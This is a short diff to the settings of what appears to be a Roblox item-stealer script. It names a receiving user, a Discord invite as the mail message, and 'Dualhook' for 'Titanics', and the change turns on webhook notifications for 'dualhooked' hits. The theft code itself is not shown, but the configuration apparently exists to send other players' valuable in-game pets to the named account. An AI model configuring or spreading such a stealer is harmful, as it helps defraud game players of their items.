@@ -9,7 +9,7 @@
 
 getgenv().Settings = {
     User = "petspsx651",
-    Webhook = false, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = ".gg/hzBAruhe2X",
     Titanics = {
         Dualhook = true,
